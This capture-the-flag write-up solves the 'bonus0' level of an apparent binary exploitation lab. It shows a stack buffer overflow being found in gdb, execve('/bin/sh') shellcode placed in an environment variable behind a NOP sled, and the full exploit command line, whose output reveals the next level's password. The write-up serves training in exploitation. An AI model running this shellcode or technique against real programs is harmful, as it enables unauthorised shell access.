# Bonus0

This program waits for 2 user inputs. It will concatenate the first 20 characters of the first input with the second input, then print a space and again the second input :

    $ ./bonus0 
    -                       <-- output
    123456789012345678901234567890    <-- first input
    -                       <-- output
    AAAABBBBCCCCDDDD        <-- second input
    12345678901234567890AAAABBBBCCCCDDDD AAAABBBBCCCCDDDD   <-- output

It seems that the buffer of the first input is very large, beacause we can't make it crash with hundreds of characters but only the first 20 characters are taken into account. However, the second input buffer is much smaller :

    $ ./bonus0 
    - 
    1234567890123456789012345678901234567890
    - 
    AAAABBBBCCCCDDDDE
    12345678901234567890AAAABBBBCCCCDDDDE AAAABBBBCCCCDDDDE
    Segmentation fault (core dumped)

The program segfaults when using more than 16 characters. Let's check the registers :

    (gdb) run ""
    Starting program: /home/user/bonus0/bonus0 ""
    - 
    12345678901234567890
    - 
    AAAABBBBCCCCDDDDEEEEFFFFGGGG
    12345678901234567890AAAABBBBCCCCDDDDEEEE��� AAAABBBBCCCCDDDDEEEE���

    Program received signal SIGSEGV, Segmentation fault.
    0x44434343 in ?? ()
    (gdb) i r
    eax            0x0	0
    ecx            0xffffffff	-1
    edx            0xb7fd28b8	-1208145736
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff720	0xbffff720
    ebp            0x43424242	0x43424242      <-- CBBB
    esi            0x0	0
    edi            0x0	0
    eip            0x44434343	0x44434343      <-- DCCC
    [...]

That means we can overflow EIP using the 10th - 13th characters.
We don't have enough space in the buffers to pass a shellcode, so we will instead pass it in an environment variable, and get its address.

    $ export PAYLOAD=$(python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')

This is the same shellcode that was used for the level2.

Now, we need to get its address :

    (gdb) b main
    Breakpoint 1 at 0x80485a7
    (gdb) r
    Starting program: /home/user/bonus0/bonus0 

    Breakpoint 1, 0x080485a7 in main ()
    (gdb) x/500s $esp
    [...]
    0xbfffff45:	 "SSH_CONNECTION=192.168.56.1 60404 192.168.56.102 4242"
    0xbfffff7b:	 "LESSOPEN=| /usr/bin/lesspipe %s"
    0xbfffff9b:	 "PAYLOAD=1\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
    0xbfffffc1:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
    0xbfffffe3:	 "/home/user/bonus0/bonus0"
    [...]
    (gdb) x/s 0xbfffff9b
    0xbfffff9b:	 "PAYLOAD=1\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"

We almost have the shellcode address, we just need to skip the 8 first character (PAYLOAD=). The final address is 0xbfffffa3.

Now we can craft our payload. The first input will only contain 20 characters to fill the buffer, our second input will contain the first 9 characters needed to overflow EIP, then our address, and then some more characters to fill up the buffer.

    bonus0@RainFall:~$ (python -c 'print "A" * 20' ; python -c 'print "B" * 9 + "\xa3\xff\xff\xbf" + "V" * 10' ; cat ) | ./bonus0 
    - 
    - 
    AAAAAAAAAAAAAAAAAAAABBBBBBBBB����VVVVVVV��� BBBBBBBBB����VVVVVVV���
    cd ../bonus1
    cat .pass
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
